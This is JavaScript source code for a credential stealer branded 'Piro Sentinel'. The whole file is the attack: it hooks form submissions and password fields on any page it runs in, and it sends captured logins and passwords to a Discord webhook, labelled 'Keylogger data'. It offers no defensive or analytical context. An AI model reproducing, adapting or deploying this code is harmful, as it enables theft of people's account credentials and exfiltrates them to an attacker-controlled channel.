let previousLogin = null;
let previousPassword = null;

function sendToDiscordWebhook(password, login) {
  if (login === previousLogin && password === previousPassword) {
    return;
  }

  if (!login || !password) return;
  const webhookUrl =
    "%WEBHOOK%";


  const message = {
    content: "",
    username: "Piro Sentinel",
    avatar_url:
      "https://raw.githubusercontent.com/freeman649/assets-thief/main/new%20logo%20piro.png",
    embeds: [
      {
        footer: {
          text: "@Piro Sentinel | https://t.me/Piro_Sentinel",
          icon_url:
            "https://raw.githubusercontent.com/freeman649/assets-thief/main/new%20logo%20piro.png",
        },
        title: `Keylogger data from ${document.title} <a:black_hearts:1149412328350163005>`,
        url: `${document.URL}`,
        color: 2829617,
        fields: [
          {
            name: "\u200b",
            value: `\`\`\`ansi\n[2;32mLogin ID: ${login}\nPassword: ${password}\n[0m[2;32m[0m\n\`\`\``,
            inline: false,
          },
        ],
      },
    ],
  };

  previousLogin = login;
  previousPassword = password;

  fetch(webhookUrl, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify(message),
  })
    .then((response) => {
      if (response.ok) {
      } else {
      }
    })
    .catch((error) => {});
}

var password_edited = false;

if (!document.title) {
  document.title = document.URL;
}

function saveForm(data) {
  if (data && typeof data === "object") {
    for (let key in data) {
      if (data.hasOwnProperty(key)) {
        let password = data[key].password;
        let login = data[key].login;
        sendToDiscordWebhook(password, login);
      }
    }
  }
}

function getPasswordInputElements() {
  var pwd_el = [];

  var el = document.getElementsByTagName("input");

  for (var i = 0; i < el.length; i++) {
    if (el[i].getAttribute("type") == "password") pwd_el.push(el[i]);
  }

  return pwd_el;
}

function listenPasswordEntered() {
  var pwd_el = getPasswordInputElements();

  for (var i = 0; i < pwd_el.length; i++) {
    pwd_el[i].addEventListener("change", function () {
      password_edited = true;
    });
  }
}

var forms = document.getElementsByTagName("form");
for (var i = 0; i < forms.length; i++) {
  forms[i].addEventListener("submit", function (e) {
    var data = {};
    data["FormName"] = e.target.name;
    data["FormAction"] = e.target.action;
    data["FormElements"] = {};
    var elements = e.target.elements;
    for (var n = 0; n < elements.length; n++) {
      data["FormElements"][elements[n].name] = elements[n].value;
    }

    if (password_edited) {
      saveForm(data);
    }
  });
}

listenPasswordEntered();
